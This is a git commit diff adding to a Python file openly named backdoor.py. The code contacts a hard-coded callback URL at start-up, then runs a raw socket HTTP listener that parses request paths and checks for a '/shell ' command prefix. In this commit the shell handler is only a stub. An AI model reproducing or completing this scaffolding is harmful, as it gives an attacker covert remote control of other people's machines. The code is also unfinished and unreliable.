a985fcc0d7b705fee170cdb31f0fc746409feeaf
LinWin-Cloud <2382546858@qq.com>
2023-03-31 22:28:15 +0800

    backdoor.py

--- Module/program/python/backdoor/backdoor.py
+++ Module/program/python/backdoor/backdoor.py
@@ -1,10 +1,41 @@
+
+connect:str = "http://127.0.0.1:8888/?api_key"
+http_port: int = 11451
+
 import os
+import socket
 import requests
 
-connect: str = ""
-port: int = 0
+def send_target():
+    requests.get(connect)
 
-connect: str = ""
+
+def http_service():
+    #print(" [INFO] START HTTP SEVICE ON PORT: "+str(port))
+    http_socket = socket.socket()
+    http_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    http_socket.bind(("127.0.0.1",http_port))
+    http_socket.listen()
+    while True:
+        conn, addr = http_socket.accept()
+        #print(conn.getsockname)
+
+        recv_message: str = ""
+        client_message = conn.makefile().readline()
+        
+        try:
+            requests_url = client_message[client_message.index(" ")+1:client_message.rfind("H")-1]
+            requests_url = requests_url.strip()
+
+            if requests_url.startswith("/shell "):
+                pass
+
+        except:
+            conn.send(bytes("error".encode()))
+            conn.close()
+            continue
 
 if __name__ == '__main__':
-    print(connect)
+    send_target()
+    http_service()
+    
